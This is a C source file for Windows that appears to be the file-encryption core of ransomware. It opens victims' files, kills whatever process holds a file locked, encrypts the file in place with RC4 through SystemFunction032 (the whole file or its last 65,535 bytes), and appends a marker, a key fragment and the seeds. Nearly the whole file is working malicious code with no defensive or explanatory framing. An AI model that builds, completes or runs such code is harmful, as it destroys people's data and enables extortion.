#include <Windows.h>
#include <wincrypt.h>
#include <stdio.h>

#include "Common.h"



// these two arrays will be used as a seed, using the hmac algorithm, *both* will generate the key
// we generate the key, write these arrays into the file, and do the encryption
// to decrypt we pull these from the file, and run the same algorithm to get the key that was used for encryption

BYTE        g_DATA1[] = { 0x70, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72, 0x64 };
BYTE        g_DATA2[] = { 0x6D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65 };


#define KEY_SIZE                    0x14                                            //          20
#define D1_D2_SIZE                  (sizeof(g_DATA1) + sizeof(g_DATA2))             //          15
#define KEY_PART_SIZE               0x04                                            //          4
#define ENC_TYPE_SIZE               0x04                                            //          4

#define MAX_FULL_ENCRYPTION         0xFFFFFFF                                       //          268435455       [268 MB]
#define PARTIAL_ENCRYPTION          0xFFFF                                          //          65535


#define TOTAL_CONFIG_SIZE           (D1_D2_SIZE + KEY_PART_SIZE + ENC_TYPE_SIZE)    //          23


// encryption types
BYTE        g_PartiallyEnc  [ENC_TYPE_SIZE] = { 0xA1, 0xA1, 0xA1, 0xA1 };
BYTE        g_FullyEnc      [ENC_TYPE_SIZE] = { 0xB2, 0xB2, 0xB2, 0xB2 };


// Kill Parent Process That Is Openning A File (Blocking Us From Having It)
#define KILLPARENT

 
typedef struct _FileInfo 
{
    HANDLE      hFile;                          // file handle
    DWORD       dwFileSize;                     // file total size
    DWORD       dwActualWorkSize;               // size that we will read/encrypt/write
    PBYTE       pHmacKey;                       // the hmac key - used for the encryption algo
    PBYTE       pFileByte;                      // pointer to data read    
    BOOL        PartiallyEnc;                   // is partially encrypted file ?

} FileInfo, *PFileInfo;


typedef struct _USTRING
{
    DWORD	    Length;
    DWORD	    MaximumLength;
    PVOID	    Buffer;

} USTRING, *PUSTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );


fnSystemFunction032 g_SystemFunction032 = NULL;



BOOL GenHmacKey(PBYTE HmacKey) {

    HCRYPTPROV  hProv           = NULL;
    HCRYPTHASH  hHash           = NULL;
    HCRYPTKEY   hKey            = NULL;
    HCRYPTHASH  hHmacHash       = NULL;
    PBYTE       pbHash          = NULL;
    DWORD       dwDataLen       = NULL;
    BOOL        bSTATE          = TRUE;
    HMAC_INFO   HmacInfo        = { 0 };

    RtlSecureZeroMemory(&HmacInfo, sizeof(HmacInfo));
    HmacInfo.HashAlgid = CALG_SHA1;


    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (!CryptHashData(hHash, g_DATA1, sizeof(g_DATA1), 0)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (!CryptDeriveKey(hProv, CALG_RC4, hHash, 0, &hKey)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (!CryptCreateHash(hProv, CALG_HMAC, hKey, 0, &hHmacHash)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (!CryptSetHashParam(hHmacHash, HP_HMAC_INFO, (BYTE*)&HmacInfo, 0)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (!CryptHashData(hHmacHash, g_DATA2, sizeof(g_DATA2), 0)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (!CryptGetHashParam(hHmacHash, HP_HASHVAL, NULL, &dwDataLen, 0)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if ((pbHash = (BYTE*)malloc(dwDataLen)) == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (!CryptGetHashParam(hHmacHash, HP_HASHVAL, pbHash, &dwDataLen, 0)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (HmacKey != NULL) {
        memcpy(HmacKey, pbHash, dwDataLen);
    }


_EndOfFunc:
    if (hHmacHash)
        CryptDestroyHash(hHmacHash);
    if (hKey)
        CryptDestroyKey(hKey);
    if (hHash)
        CryptDestroyHash(hHash);
    if (hProv)
        CryptReleaseContext(hProv, 0);
    if (pbHash)
        ZeroMemory(pbHash, dwDataLen); free(pbHash);

    return bSTATE;
}







BOOL GetFileHandle(IN LPWSTR szFileName, OUT HANDLE* hFileHandle, OUT DWORD* dwFileSize) {
    
    HANDLE          hFile       = INVALID_HANDLE_VALUE;
    DWORD           dwError     = NULL;
    LARGE_INTEGER   FileSize    = { 0 };

    if ((hFile = CreateFileW(szFileName, GENERIC_READ | GENERIC_WRITE | DELETE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
       
#ifdef KILLPARENT
        if ((dwError = GetLastError()) == ERROR_SHARING_VIOLATION || dwError == ERROR_LOCK_VIOLATION) {
            if (KillParentProcess(szFileName)) {
                if ((hFile = CreateFileW(szFileName, GENERIC_READ | GENERIC_WRITE | DELETE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
                    return ReportError("GetFileHandle", "CreateFileW[2]");
                }
            }
        }
#endif // KILLPARENT

        if (hFile == INVALID_HANDLE_VALUE){
            return ReportError("GetFileHandle", "CreateFileW[1]");
        }
    }

    if (!GetFileSizeEx(hFile, &FileSize) || FileSize.QuadPart == NULL) {
        return ReportError("GetFileHandle", "GetFileSizeEx");
    }

    *hFileHandle = hFile;
    *dwFileSize = FileSize.QuadPart;

    if (*hFileHandle == INVALID_HANDLE_VALUE || *dwFileSize == NULL)
        return FALSE;

    return TRUE;
}



BOOL ReadFileBuffer(IN HANDLE hFile, IN DWORD dwFileSize, OUT BYTE* pBuffer) {
    
    if (hFile == NULL || hFile == INVALID_HANDLE_VALUE || dwFileSize == NULL)
        return FALSE;


    BOOL            bSTATE                  = TRUE;
    DWORD           dwNumberOfBytesRead     = NULL;
    ULONG           Offset                  = -1 * dwFileSize;

    if (SetFilePointer(hFile, Offset, NULL, FILE_END) == INVALID_SET_FILE_POINTER)
        bSTATE = ReportError("ReadFileBuffer", "SetFilePointer");

    if ((pBuffer && !ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL)) || dwNumberOfBytesRead != dwFileSize)
        bSTATE = ReportError("ReadFileBuffer", "ReadFile");

    return bSTATE;
}



BOOL WriteFileBuffer(IN FileInfo St) {

    BOOL            bSTATE                  = TRUE;
    DWORD           dwSizeOfAllocation      = (DWORD)(St.dwActualWorkSize + TOTAL_CONFIG_SIZE);
    DWORD           dwNmbrOfBytesWritten    = NULL;
    PBYTE           pBuffer                 = (PBYTE)LocalAlloc(LPTR, dwSizeOfAllocation);
    ULONG           Offset                  = -1 * St.dwActualWorkSize;

    if (!pBuffer)
        return FALSE;

    // copying the config 
    memcpy(pBuffer, St.pFileByte, St.dwActualWorkSize);
    if (St.PartiallyEnc)
        memcpy((PVOID)(pBuffer + St.dwActualWorkSize), g_PartiallyEnc, ENC_TYPE_SIZE);
    else
        memcpy((PVOID)(pBuffer + St.dwActualWorkSize), g_FullyEnc, ENC_TYPE_SIZE);

    memcpy((PVOID)(pBuffer + St.dwActualWorkSize + ENC_TYPE_SIZE), St.pHmacKey, KEY_PART_SIZE);
    memcpy((PVOID)(pBuffer + St.dwActualWorkSize + ENC_TYPE_SIZE + KEY_PART_SIZE), g_DATA2, sizeof(g_DATA2));
    memcpy((PVOID)(pBuffer + St.dwActualWorkSize + ENC_TYPE_SIZE + KEY_PART_SIZE + sizeof(g_DATA2)), g_DATA1, sizeof(g_DATA1));


    if (SetFilePointer(St.hFile, Offset, NULL, FILE_END) == INVALID_SET_FILE_POINTER)
        bSTATE = ReportError("WriteFileBuffer", "SetFilePointer");

    if ((bSTATE && !WriteFile(St.hFile, pBuffer, dwSizeOfAllocation, &dwNmbrOfBytesWritten, NULL)) || dwNmbrOfBytesWritten != dwSizeOfAllocation)
        bSTATE = ReportError("WriteFileBuffer", "WriteFile");

    LocalFree(pBuffer);

    return bSTATE;
}



BOOL InitializeStruct(IN LPWSTR szFileName, OUT FileInfo* St) {


    HANDLE hFile    = INVALID_HANDLE_VALUE;
    DWORD  dwFile   = NULL;

    if (!GetFileHandle(szFileName, &hFile, &dwFile))
        return FALSE;

    St->hFile       = hFile;
    St->dwFileSize  = dwFile;

    if (St->dwFileSize < MAX_FULL_ENCRYPTION) {
        // encrypt all the file
        St->PartiallyEnc        = FALSE;
        St->dwActualWorkSize    = dwFile;
    }
    else {
        // if partially encrypt
        St->PartiallyEnc        = TRUE;
        St->dwActualWorkSize    = PARTIAL_ENCRYPTION;
    }
    
    St->pFileByte   = (PBYTE)LocalAlloc(LPTR, St->dwActualWorkSize);
    St->pHmacKey    = (PBYTE)LocalAlloc(LPTR, KEY_SIZE);
    
    if (!St->pHmacKey || (St->pHmacKey && !GenHmacKey(St->pHmacKey)))
        return FALSE;

    if (!ReadFileBuffer(hFile, St->dwActualWorkSize, St->pFileByte))
        return FALSE;

   
    return TRUE;
}



BOOL IsAlreadyEncrypted(IN FileInfo St) {

    if (St.pFileByte == NULL)
        return FALSE;
    
    PBYTE pPossibleTypePosition = (PBYTE)(St.pFileByte + St.dwActualWorkSize - (TOTAL_CONFIG_SIZE));
    
    if (*(ULONG*)pPossibleTypePosition == *(ULONG*)g_PartiallyEnc)
        return TRUE;

    if (*(ULONG*)pPossibleTypePosition == *(ULONG*)g_FullyEnc)
        return TRUE;

    return FALSE;
}


BOOL InstallEncryption(IN LPWSTR szFileName) {
    
    BOOL        bSTATE      = TRUE;
    NTSTATUS	STATUS      = NULL;
    FileInfo    St          = { 0 };
    USTRING     Key         = { 0 };
    USTRING     Buf         = { 0 };

    RtlSecureZeroMemory(&St, sizeof(FileInfo));
    RtlSecureZeroMemory(&Key, sizeof(USTRING));
    RtlSecureZeroMemory(&Buf, sizeof(USTRING));


    if (!InitializeStruct(szFileName, &St)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (IsAlreadyEncrypted(St)) {
        printf("[+] File Is Already Encrypted \n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    Key.Buffer = (PVOID)St.pHmacKey;
    Key.Length = Key.MaximumLength = KEY_SIZE;

    Buf.Buffer = (PVOID)St.pFileByte;
    Buf.Length = Buf.MaximumLength = St.dwActualWorkSize;
    
    

    if (!g_SystemFunction032)
        g_SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    if ((STATUS = g_SystemFunction032(&Buf, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (!WriteFileBuffer(St)) {
        bSTATE = FALSE; goto _EndOfFunc;
    }


    // used for shifting the seed - to generate a new random key each time 

    g_DATA1[0] = g_DATA1[0] ^ St.pHmacKey[0];
    g_DATA1[1] = g_DATA1[1] ^ St.pHmacKey[1];
    g_DATA1[2] = g_DATA1[2] ^ St.pHmacKey[2];
    g_DATA1[3] = g_DATA1[3] ^ St.pHmacKey[3];

    g_DATA2[0] = g_DATA1[0] ^ St.pHmacKey[4];
    g_DATA2[1] = g_DATA1[1] ^ St.pHmacKey[5];
    g_DATA2[2] = g_DATA1[2] ^ St.pHmacKey[6];
    g_DATA2[3] = g_DATA1[3] ^ St.pHmacKey[7];



_EndOfFunc:
    if(St.pHmacKey)
        LocalFree(St.pHmacKey);
    if(St.pFileByte)
        LocalFree(St.pFileByte);
    if(St.hFile)
        CloseHandle(St.hFile);
    return bSTATE;
}


























/*

            FULL ENCRYPTION									   PARTIAL ENCRYPTION
    -----------------------------						-----------------------------
    |							|						|							|
    |							|						|							|
    |							|						|	      RAW DATA	        |
    |		                    |						|							|
    |							|						|							|
    |							|						|							|
   	|         ENC DATA			|					    -----------------------------
    |							|                       |							|    
    |							|                       |							|
    |							|                       |	 65535 BYTE ENC DATA    |
    |							|                       |							|
    |							|                       |							|
    -----------------------------                       -----------------------------
    |	4 BYTE ECRYPTION TYPE   |						|	4 BYTE ECRYPTION TYPE   |
    |	   [0xB2B2B2B2]			|						|		[0xA1A1A1A1]		|
    -----------------------------						-----------------------------
    |  4 BYTE PART OF THE KEY	|						|  4 BYTE PART OF THE KEY	|
    -----------------------------						-----------------------------
    |							|						|							|
    |	  15 BYTE [SEEDS]		|						|	   15 BYTE [SEEDS]		|
    |							|						|							|
    |							|						|							|
    -----------------------------						-----------------------------

*/
